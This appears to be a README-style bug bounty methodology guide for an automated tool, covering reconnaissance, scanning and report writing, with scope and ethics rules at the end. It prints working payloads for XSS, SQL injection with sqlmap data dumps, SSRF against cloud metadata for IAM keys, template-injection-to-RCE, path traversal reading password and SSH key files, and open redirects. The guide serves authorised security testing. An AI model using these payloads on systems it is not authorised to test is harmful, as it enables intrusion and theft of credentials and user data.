# 🎯 Bug Bounty Methodology — Complete Guide

> Full attack methodology used by **AI-BugBounty-Hunter**: from zero knowledge to submission-ready report.

---

## 📋 Table of Contents

1. [Reconnaissance](#-phase-1-reconnaissance)
2. [Surface Enumeration](#-phase-2-surface-enumeration)
3. [Vulnerability Scanning](#-phase-3-vulnerability-scanning)
   - [XSS](#-xss-cross-site-scripting)
   - [SQL Injection](#-sql-injection-sqli)
   - [SSRF](#-ssrf-server-side-request-forgery)
   - [SSTI](#-ssti-server-side-template-injection)
   - [LFI](#-lfi--path-traversal)
   - [Open Redirect](#-open-redirect)
   - [IDOR](#-idor-insecure-direct-object-reference)
   - [API Security](#-api-security)
4. [AI Analysis & Validation](#-phase-4-ai-analysis--validation)
5. [Report Writing](#-phase-5-report-writing)
6. [Platform-Specific Tips](#-platform-specific-tips)
7. [Tools Reference](#-tools-reference)

---

## 📡 Phase 1: Reconnaissance

> **Goal**: Map the full attack surface before touching anything.

### 1.1 Subdomain Enumeration

**What the tool does automatically:**
- Queries **CRT.sh** (Certificate Transparency logs)
- Queries **Wayback Machine** historical data
- Queries **SecurityTrails** API (if key set)
- Uses **AI to predict** subdomains from naming patterns

```bash
# Manual tools
subfinder -d target.com -all -silent -o subdomains.txt
amass enum -passive -d target.com -o amass.txt
cat subdomains.txt amass.txt | sort -u > all_subs.txt

# CRT.sh (free, no API key)
curl -s "https://crt.sh/?q=%25.target.com&output=json" \
  | jq -r '.[].name_value' | sort -u

# Wayback Machine
curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com&output=text&fl=original&collapse=urlkey" \
  | grep -oP '[a-z0-9-]+\.target\.com' | sort -u
```

**What good subdomains look like:**
```
admin.target.com       ← High value: admin panels
api.target.com         ← API endpoints (IDOR goldmine)
dev.target.com         ← Dev environments (less hardened)
staging.target.com     ← Often has debug features on
vpn.target.com         ← Internal access
beta.target.com        ← New features, less tested
```

---

### 1.2 OSINT Intelligence

```bash
# IP + ASN info
curl https://ipinfo.io/target.com

# WHOIS
whois target.com

# Shodan (finds exposed services)
shodan search org:"Target Company" port:8080

# Google Dorks
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com "internal use only"
site:target.com ext:env OR ext:config OR ext:sql

# GitHub secrets leak
site:github.com "target.com" "api_key"
site:github.com "target.com" "password"
site:github.com "target.com" DB_PASSWORD
```

---

### 1.3 Technology Fingerprinting

```bash
# Identify frameworks, servers, WAFs
whatweb https://target.com
wappalyzer-cli https://target.com

# WAF detection
wafw00f https://target.com

# HTTP headers analysis
curl -I https://target.com

# Check robots.txt and sitemap
curl https://target.com/robots.txt
curl https://target.com/sitemap.xml
```

**Why tech stack matters:**

| Technology Found | What to Test |
|-----------------|-------------|
| PHP | LFI, RFI, Type Juggling |
| Rails | Mass Assignment, CSRF |
| Django | Debug mode, Template injection |
| Jinja2 | SSTI `{{7*7}}` |
| Liquid (Shopify) | Template injection |
| GraphQL | Introspection, injection |
| JWT Auth | Algorithm confusion, weak secret |
| S3 Buckets | Public read/write access |

---

## 🌐 Phase 2: Surface Enumeration

### 2.1 Live Host Discovery

```bash
# Check which subdomains are alive
cat subdomains.txt | httpx -silent -status-code -title -tech-detect -o live.txt

# Screenshot all live hosts
gowitness file -f live.txt -P screenshots/

# Find interesting ones fast
cat live.txt | grep -E "200|301|302" | grep -v "cloudflare"
```

### 2.2 URL & Parameter Discovery

```bash
# Modern crawler
katana -u https://target.com -d 5 -silent -o urls.txt

# Wayback Machine URLs (finds old/hidden endpoints)
waybackurls target.com > wayback.txt
gau target.com > gau.txt
cat wayback.txt gau.txt | sort -u > all_urls.txt

# Filter URLs with parameters (injection targets)
cat all_urls.txt | grep "=" > params.txt

# Find API endpoints
cat all_urls.txt | grep -E "/api/|/v1/|/v2/|/graphql|/rest/"

# Directory brute-force
ffuf -u https://target.com/FUZZ -w /wordlist/common.txt -mc 200,301,302,403
feroxbuster -u https://target.com -w wordlists/common_dirs.txt
```

### 2.3 Port Scanning

```bash
# Find non-standard ports (often have dev tools, debug)
nmap -p- --open -T4 target.com

# Common interesting ports
21   FTP       → Anonymous login?
22   SSH       → Brute-force test
80   HTTP      → Always check
443  HTTPS     → Always check
3000 Node.js   → Dev server exposed?
4000 Rails     → Dev server?
5000 Flask     → Debug mode?
8080 Alt-HTTP  → Admin panel?
8443 Alt-HTTPS → Internal API?
8888 Jupyter   → Remote code exec!
9200 Elastic   → Unauthenticated search DB?
27017 MongoDB  → Unauthenticated DB?
6379 Redis     → Unauthenticated cache?
```

---

## 🛡 Phase 3: Vulnerability Scanning

---

### 🔸 XSS (Cross-Site Scripting)

**Where to look:**
- Search boxes, comment fields, profile names
- URL parameters reflected in page: `?q=`, `?search=`, `?error=`
- Error messages echoing user input
- Import/export features

**Tool payloads tested automatically:**
```html
<script>alert(1)</script>
"><img src=x onerror=alert(1)>
javascript:alert(document.cookie)
<svg onload=alert(1)>
'-alert(1)-'
\u003cscript\u003ealert(1)\u003c/script\u003e
<iframe src="javascript:alert(1)">

<!-- WAF Bypass payloads -->
<ScRiPt>alert(1)</ScRiPt>
<scr<script>ipt>alert(1)</scr</script>ipt>
<<script>alert(1)//<</script>
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;(1)">
```

**How to confirm XSS:**
```
1. Inject: ?q=<script>alert(document.domain)</script>
2. Look for your payload in page source
3. Execute in browser → alert pops
4. Check: can you steal cookies? (document.cookie)
5. Test: can other users be affected? (Stored XSS)

Proof: Screenshot + video of alert box showing domain/cookies
```

**Manual testing:**
```bash
# Automated XSS scanner
dalfox url "https://target.com/search?q=test" -b your-burp-collaborator.com
echo "https://target.com/search?q=FUZZ" | kxss
```

---

### 🔸 SQL Injection (SQLi)

**Where to look:**
- Login forms: `?username=admin&password=test`
- ID parameters: `?id=1`, `?user=5`, `?category=3`
- Search: `?q=phone`
- Order/filter: `?sort=price&order=asc`

**Detection payloads:**
```sql
-- Error-based (look for DB errors in response)
'
''
`
')
"))
' OR '1'='1
1' AND '1'='2

-- Time-based blind (page delays = vulnerable)
1' AND SLEEP(5)--
1; WAITFOR DELAY '0:0:5'--
1' AND pg_sleep(5)--

-- Boolean-based (different response = vulnerable)
1 AND 1=1    (normal response)
1 AND 1=2    (different/broken response)
```

**How to confirm SQLi:**
```
1. Boolean test: ?id=1 AND 1=1 vs ?id=1 AND 1=2
   → Different pages? = SQLi found!

2. Time test: ?id=1; WAITFOR DELAY '0:0:5'--
   → Page takes 5+ seconds? = SQLi found!

3. Error: just add ' to parameter
   → Database error visible? = SQLi found!
```

**Manual exploitation:**
```bash
# Automated full exploitation
sqlmap -u "https://target.com/item?id=1" --dbs --batch
sqlmap -u "https://target.com/login" \
  --data="username=admin&password=test" \
  --level=5 --risk=3 --dbs

# With cookie (authenticated)
sqlmap -u "https://target.com/profile?id=1" \
  --cookie="session=abc123" \
  --dbs --tables --dump
```

**What to dump for maximum impact:**
```
information_schema.tables   → All table names
users / accounts            → Emails + password hashes
orders / payments           → Credit card data (PCI DSS!)
sessions / tokens           → Account takeover
admin_users                 → Admin credentials
```

---

### 🔸 SSRF (Server-Side Request Forgery)

**Where to look:**
- `?url=`, `?webhook=`, `?redirect=`, `?image=`, `?fetch=`
- PDF/screenshot generators
- Import from URL features
- OAuth callback URLs
- Webhook configurations

**Tool payloads tested automatically:**
```
http://169.254.169.254/latest/meta-data/          (AWS metadata)
http://169.254.169.254/latest/meta-data/iam/      (AWS IAM credentials!)
http://metadata.google.internal/computeMetadata/  (GCP)
http://169.254.169.254/metadata/v1/               (DigitalOcean)
http://localhost/admin
http://127.0.0.1:6379  (Redis)
http://127.0.0.1:27017 (MongoDB)
http://0.0.0.0/
http://[::1]/
```

**How to confirm SSRF:**
```bash
# Step 1: Set up listener
# Use: https://webhook.site  OR  Burp Collaborator

# Step 2: Send payload
curl "https://target.com/fetch?url=https://your-webhook.site/test"

# Step 3: Check if your webhook received a request
# → If yes = SSRF confirmed!

# Step 4: Try AWS metadata for critical impact
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Maximum impact SSRF:**
```
1. AWS IMDSv1 → Get IAM access keys → Full AWS account access
2. Internal network scan → Find internal services
3. Cloud storage → Read/write internal S3 buckets
4. RCE potential → SSRF → Redis/Gopher protocol
```

---

### 🔸 SSTI (Server-Side Template Injection)

**Where to look:**
- Custom email/notification templates
- Username displayed in greetings
- Error messages
- Report generation
- Any "preview" feature

**Detection payloads:**
```python
# Jinja2 / Python
{{7*7}}         → 49? = Jinja2
{{7*'7'}}       → 7777777? = Jinja2
{{config}}      → dumps app config
{{request}}     → request object

# Twig / PHP
{{7*7}}         → 49? = Twig
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

# FreeMarker / Java
${7*7}          → 49? = FreeMarker
${"freemarker.template.utility.Execute"?new()("id")}

# Liquid (Shopify)
{{7*7}}
{{ shop.name }}
{% assign x = 7 | times: 7 %}{{ x }}
```

**Escalation to RCE (Jinja2):**
```python
# Read files
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}

# Execute commands
{{ ''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
```

---

### 🔸 LFI / Path Traversal

**Where to look:**
- `?file=`, `?page=`, `?template=`, `?include=`
- Download endpoints: `/download?path=report.pdf`
- Language selection: `?lang=en`

**Tool payloads:**
```
../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
....\/....\/....\/etc/passwd
/proc/self/environ
/var/log/apache2/access.log   (+ log poisoning → RCE!)

Windows:
../../../windows/win.ini
../../../windows/system32/drivers/etc/hosts
```

**What to read for maximum impact:**
```
/etc/passwd              → usernames
/etc/shadow              → password hashes
/home/user/.ssh/id_rsa   → SSH private key (RCE!)
/var/www/html/.env       → APP secrets, DB passwords
/proc/self/environ       → Environment variables
/var/log/nginx/access.log→ Log poisoning → RCE
```

---

### 🔸 Open Redirect

**Where to look:**
- `?redirect=`, `?next=`, `?return=`, `?url=`, `?continue=`
- Post-login redirects
- OAuth `redirect_uri` parameter

**Payloads:**
```
?redirect=https://evil.com
?next=//evil.com
?url=https:evil.com
?redirect=/\/evil.com
?redirect=https://target.com.evil.com  (subdomain takeover feel)

OAuth bypass:
redirect_uri=https://target.com/../evil.com
redirect_uri=https://evil.com%40target.com
```

**Why this matters:**
```
1. OAuth token theft: User logs in → token sent to attacker
2. Phishing: Official URL that redirects to evil site
3. Account takeover: Combine with CSRF
```

---

### 🔸 IDOR (Insecure Direct Object Reference)

**Where to look:**
- `/api/orders/12345` → change to `12346`
- `/user/profile?id=101` → change to `102`
- `/document/abc-uuid` → enumerate or guess
- Any numeric ID in URL or request body

**Testing methodology:**
```
1. Create 2 accounts: attacker@gmail.com + victim@gmail.com

2. As VICTIM:
   - Create order → note order ID: 99999
   - Upload document → note doc ID: doc_abc123
   - Set profile → note user ID: 1001

3. As ATTACKER (different session):
   GET /api/orders/99999          ← Can I see victim's order?
   GET /api/documents/doc_abc123  ← Can I read victim's doc?
   PUT /api/users/1001/email      ← Can I change victim's email?
   DELETE /api/orders/99999       ← Can I delete victim's order?

4. Try:
   - Changing numeric IDs ±1, ±10, ±100
   - Changing UUID/GUIDs to another user's
   - Changing to 0, -1, null, undefined
   - Horizontal: same role, different user
   - Vertical: lower role accessing higher role data

Impact levels:
   Read other user data     = Medium
   Modify other user data   = High
   Delete other user data   = High
   Access admin data        = Critical
```

---

### 🔸 API Security

**What the tool tests:**
```
1. CORS misconfiguration
   Origin: https://evil.com  → allowed? = credentials exposed

2. API keys in responses
   Look for: api_key, secret, token, password in JSON

3. GraphQL introspection
   POST /graphql {"query": "{__schema{types{name}}}"}

4. Unauthenticated endpoints
   Remove auth token → still works? = broken auth

5. JWT weaknesses
   - Algorithm: HS256 → RS256 confusion
   - Secret: try "secret", "password", ""
   - None algorithm: alg: "none"

6. Rate limiting
   POST /api/login 1000 times → locked out?
   
7. Mass assignment
   POST /api/user {"role": "admin"}  → promoted?
```

---

## 🤖 Phase 4: AI Analysis & Validation

**The 7-Question Validation Gate** (eliminates false positives):

```
1. Is this genuinely exploitable by a real attacker (not scanner noise)?
2. Can the impact be demonstrated with a clear PoC?
3. Is there a realistic attack chain given target's defenses?
4. Does this bypass a real security boundary (not self-XSS)?
5. Is this novel for this target (not expected/intended behavior)?
6. What is the concrete, measurable business impact?
7. Would a human HackerOne triager accept this (not close as N/A)?
```

**CVSS Score calculation:**
```
Base Score = f(AV, AC, PR, UI, S, C, I, A)

AV: Attack Vector    (N=Network, A=Adjacent, L=Local, P=Physical)
AC: Attack Complexity (L=Low, H=High)
PR: Privileges Required (N=None, L=Low, H=High)
UI: User Interaction (N=None, R=Required)
S:  Scope (U=Unchanged, C=Changed)
C:  Confidentiality (H/L/N)
I:  Integrity (H/L/N)
A:  Availability (H/L/N)

Example — SQL Injection (unauth, network, full DB dump):
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 (Critical)

Example — XSS (reflected, needs user interaction):
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N = 6.1 (Medium)
```

---

## 📝 Phase 5: Report Writing

### HackerOne Report Template

```markdown
## Title
[Component] Vulnerability Type leads to Impact

Example:
"SQL Injection in /api/customers endpoint allows unauthenticated 
database dump exposing 2M+ customer records"

## Severity
Critical / High / Medium / Low / Informational

## Summary
2-3 sentences: What is the bug, where is it, what's the impact.

## Vulnerability Details
Full technical explanation of the vulnerability.
Include: affected parameter, root cause, why it's exploitable.

## Steps to Reproduce
1. Navigate to https://target.com/api/customers?id=1
2. Modify the request to: ?id=1' UNION SELECT email,password,NULL FROM users--
3. Observe the response contains customer email addresses and password hashes
4. [Screenshot attached]

## Impact
Be specific and business-focused:
- "Attacker can read all 2M customer email addresses"
- "Can obtain plaintext passwords (if not hashed)"
- "PII exposure triggers GDPR notification requirement"
- "Competitor could steal entire customer database"

## Proof of Concept
Include:
✅ Screenshots of the exploit working
✅ Video recording (Loom, OBS)
✅ Burp Suite request/response
✅ curl command that reproduces it

Example curl PoC:
curl -s "https://target.com/api/user?id=1' UNION SELECT email,pass FROM users--" | jq .

## Remediation
Specific fix, not just "sanitize input":
- Use parameterized queries / prepared statements
- Example: cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
- Apply principle of least privilege on DB user
- Implement WAF rule for SQLi patterns

## CVSS
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
Score: 9.8 (Critical)

## Timeline
- Found: 2024-01-15
- Reported: 2024-01-15
```

### Bugcrowd Report Template

```markdown
## Bug Title
[Short, specific title]

## Vulnerability Type
[Use Bugcrowd taxonomy: P1/P2/P3/P4]
SENSITIVE_DATA_EXPOSURE > Database > SQL Injection

## Severity
P1 (Critical) / P2 (High) / P3 (Medium) / P4 (Low)

## Description
[Full technical description]

## Reproduction Steps
[Numbered steps]

## Impact
[Specific impact statement]

## Proof of Concept
[Screenshots, videos, curl commands]

## Suggested Fix
[Specific remediation advice]
```

---

## 🎯 Platform-Specific Tips

### HackerOne
```
✅ Check program scope CAREFULLY before starting
✅ Read all "Out of scope" items
✅ Check "Previous reports" to avoid duplicates
✅ Bounty table: understand P1-P5 ratings
✅ Use H1 markdown formatting
✅ Response time: usually 24-72 hours for triage
✅ Escalate via comments if no response in 5 days
```

### Bugcrowd
```
✅ Use Bugcrowd VRT (Vulnerability Rating Taxonomy)
✅ Set correct P-rating (P1=Critical → P4=Low)
✅ Detailed PoC always required
✅ Duplicate check: common on big programs
```

### Intigriti
```
✅ European platform → GDPR-focused bugs valued higher
✅ Strong on web vulns
✅ Good for Dutch/Belgian company programs
```

### Immunefi (Web3/Crypto)
```
✅ Blockchain specific: smart contract bugs
✅ Focus: reentrancy, integer overflow, access control
✅ Use tools: Slither, Mythril, Echidna
✅ Bounties can be $50,000 - $10,000,000!
```

---

## 🧰 Tools Reference

### Reconnaissance
| Tool | Purpose | Install |
|------|---------|---------|
| `subfinder` | Subdomain enum | `go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest` |
| `amass` | Subdomain enum | `go install github.com/owasp-amass/amass/v4/...@master` |
| `httpx` | Live host probe | `go install github.com/projectdiscovery/httpx/cmd/httpx@latest` |
| `katana` | URL crawl | `go install github.com/projectdiscovery/katana/cmd/katana@latest` |
| `gau` | Wayback URLs | `go install github.com/lc/gau/v2/cmd/gau@latest` |
| `waybackurls` | Archive URLs | `go install github.com/tomnomnom/waybackurls@latest` |
| `gowitness` | Screenshots | `go install github.com/sensepost/gowitness@latest` |

### Scanning
| Tool | Purpose | Install |
|------|---------|---------|
| `dalfox` | XSS scanner | `go install github.com/hahwul/dalfox/v2@latest` |
| `sqlmap` | SQLi scanner | `pip install sqlmap` |
| `nuclei` | Template-based | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` |
| `ffuf` | Fuzzer | `go install github.com/ffuf/ffuf/v2@latest` |
| `feroxbuster` | Dir brute | `apt install feroxbuster` |

### Analysis
| Tool | Purpose | Install |
|------|---------|---------|
| `Burp Suite` | Proxy/intercept | [portswigger.net](https://portswigger.net/burp) |
| `OWASP ZAP` | Free scanner | [zaproxy.org](https://zaproxy.org) |
| `caido` | Modern proxy | [caido.io](https://caido.io) |

### AI-Assisted (This Tool)
```bash
bugbounty target.com                    # Full automated pipeline
bugbounty target.com --quick            # Passive recon only
bugbounty target.com --stealth          # Slow/stealth mode
bugbounty target.com --report           # Generate report
python telegram_bot.py                  # Run as Telegram bot
```

---

## 📚 Learning Resources

| Resource | URL |
|---------|-----|
| HackerOne Hacktivity | [hackerone.com/hacktivity](https://hackerone.com/hacktivity) |
| PortSwigger Web Academy | [portswigger.net/web-security](https://portswigger.net/web-security) |
| OWASP Top 10 | [owasp.org/top10](https://owasp.org/www-project-top-ten/) |
| HackTricks | [book.hacktricks.xyz](https://book.hacktricks.xyz) |
| PayloadsAllTheThings | [github.com/swisskyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings) |
| Bug Bounty Forum | [bugbountyforum.com](https://bugbountyforum.com) |

---

## ⚠️ Legal & Ethical Rules

```
✅ ALWAYS check program scope before scanning
✅ Only test in-scope domains
✅ Never access other users' data beyond PoC
✅ Report immediately — don't exploit further
✅ Don't perform DoS or destructive testing
✅ Respect rate limits
✅ Keep findings confidential until fixed

❌ NEVER scan out-of-scope targets
❌ NEVER use findings for personal gain
❌ NEVER sell vulnerabilities to third parties
❌ NEVER perform social engineering
❌ NEVER test without explicit permission
```

---

*This methodology is built into AI-BugBounty-Hunter's automated pipeline.*
*Use `/scan target.com` in the Telegram bot to run this full pipeline automatically.*
